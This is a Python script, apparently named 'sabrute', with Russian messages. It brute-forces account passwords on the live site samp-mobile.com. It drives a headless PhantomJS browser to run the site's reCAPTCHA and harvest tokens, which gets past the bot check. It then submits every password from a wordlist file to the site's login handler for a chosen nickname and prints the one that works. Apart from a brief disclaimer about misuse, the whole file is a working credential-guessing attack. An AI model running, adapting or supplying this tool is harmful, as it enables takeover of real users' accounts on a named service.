# -*- coding: utf-8 -*-
import aiohttp
import asyncio
import json
import time
import os
import argparse
import wget
import zipfile
import tarfile

from selenium import webdriver


# TODO: запуск веб сервера для отображения информации о процессе

async def mainAsync():
	userName = argparse.ArgumentParser()
	userName.add_argument('--nickname', help='set nickname', required=True)
	userName = userName.parse_args()
	userName = userName.nickname

	print('Разработчик не несет ответсвенности за неправомерное использование данной программы')

	session = aiohttp.ClientSession()

	if os.name == 'nt':
		if not os.path.exists(os.path.join(os.path.dirname(__file__), 'sabrute\\resources\\phantomjs-2.1.1-windows\\bin\\phantomjs.exe')):
			wget.download('https://bitbucket.org/ariya/phantomjs/downloads/phantomjs-2.1.1-windows.zip', out=os.path.join(os.path.dirname(__file__), 'sabrute/resources'))
			zipfile.ZipFile(os.path.join(os.path.dirname(__file__), 'sabrute/resources/phantomjs-2.1.1-windows.zip'), 'r').extractall(os.path.join(os.path.dirname(__file__), 'sabrute\\resources'))
		driver = webdriver.PhantomJS(executable_path=os.path.join(os.path.dirname(__file__), 'sabrute\\resources\\phantomjs-2.1.1-windows\\bin\\phantomjs.exe'))
	else:
		if not os.path.exists(os.path.join(os.path.dirname(__file__), 'sabrute\\resources\\phantomjs-2.1.1-linux-x86_64\\bin\\phantomjs')):
			wget.download('https://bitbucket.org/ariya/phantomjs/downloads/phantomjs-2.1.1-linux-x86_64.tar.bz2', out=os.path.join(os.path.dirname(__file__), 'sabrute/resources'))
			tarfile.open(os.path.join(os.path.dirname(__file__), 'sabrute/resources/phantomjs-2.1.1-windows.zip'), 'r:bz2').extractall(os.path.join(os.path.dirname(__file__), 'sabrute\\resources'))
		driver = webdriver.PhantomJS(executable_path=os.path.join(os.path.dirname(__file__), 'sabrute\\resources\\phantomjs-2.1.1-linux-x86_64\\bin\\phantomjs'))
	# TODO: поддержка 32 битных систем
	driver.get('https://samp-mobile.com/account/')

	base = open(os.path.join(os.path.dirname(__file__), 'sabrute\\resources\\base'))
	base = base.read()
	base = base.split()

	startTime = time.time()

	for userPassword in base:
		try:
			id = base.index(userPassword)
			workTime = time.time() - startTime
			workSpeed = id / workTime
		except:
			workSpeed = 0

		while True:
			# TODO: получение токена напрямую через логи браузера
			driver.execute_script("grecaptcha.ready(function() {grecaptcha.execute('6LfhuPcUAAAAAPTrbOFLnwQMXDbkTrwDeZ6xodrO', {action: 'homepage'}).then(function(token) {document.getElementById('g-recaptcha-response').value=token;});});")
			g_recaptcha_response = driver.find_element_by_id('g-recaptcha-response')
			g_recaptcha_response = g_recaptcha_response.get_attribute('value')
			if not g_recaptcha_response:
				continue
			data = {
				"user_name" : userName,
				"user_password" : userPassword,
				"act" : "account_login",
				"g-recaptcha-response" : g_recaptcha_response
			}
			response = await session.post('https://samp-mobile.com/system/global_classes/Handler.php', data=data)
			response = await response.json()
			status = response['status']
			message = response['message']
			# WTF
			if message == 'Вы не проходите проверку от Google Recaptcha.':
				continue
			else:
				# TODO: запись информации о процессе в файл
				if status == 'ok':
					if os.name == 'nt':
						os.system('cls')
					else:
						os.system('clear')
					print(f'Верный пароль: {userPassword}\nВремя: {int(workTime)}')
					input()
					exit()
				else:
					if os.name == 'nt':
						os.system('cls')
					else:
						os.system('clear')
					print(f'Текущий пароль: {userPassword}\nВремя: {int(workTime)}\nСкорость: {int(workSpeed)}')
					break

	if os.name == 'nt':
		os.system('cls')
	else:
		os.system('clear')
	print('Пароль не найден')
	input()
	exit()

def main():
	loop = asyncio.get_event_loop()
	loop.run_until_complete(mainAsync())

if __name__ == '__main__':
	main()